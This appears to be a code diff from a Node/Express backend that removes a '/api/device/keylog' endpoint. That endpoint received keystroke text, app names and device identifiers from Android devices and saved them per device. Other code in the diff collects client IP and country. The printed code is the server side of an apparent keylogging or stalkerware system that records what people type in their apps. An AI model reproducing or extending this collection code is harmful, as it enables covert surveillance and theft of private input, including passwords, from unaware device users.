@@ -464,37 +464,6 @@ async function startServer() {
       }
 
       const targetUser = await resolveDeviceOwner();
-      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
-
-      await createKeylog({
-        userId: targetUser.id,
-        deviceId: String(deviceId),
-        appName: rawAppName.slice(0, 255),
-        keyText: rawKeyText,
-      });
-
-      return res.json({ success: true });
-    } catch (error) {
-      console.error("[Device Keylog] Failed:", error);
-      const message = error instanceof Error ? error.message : "Falha ao salvar keylog";
-      return res.status(500).json({ success: false, message });
-    }
-  });
-
-  app.post("/api/device/keylog", async (req, res) => {
-    try {
-      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
-      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
-      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
-      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
-      const rawAppName = typeof req.body?.appName === "string" ? req.body.appName : "Desconhecido";
-      const rawKeyText = typeof req.body?.keyText === "string" ? req.body.keyText.slice(0, 2048) : "";
-
-      if (!rawDeviceUid || !rawPackageName || !rawKeyText) {
-        return res.status(400).json({ success: false, message: "deviceUid, packageName e keyText sao obrigatorios" });
-      }
-
-      const targetUser = await resolveDeviceOwner();
       const { deviceId, deviceName } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
       const clientIp = extractClientIp(req);
       const countryCodeFromHeader = extractCountryCode(req);
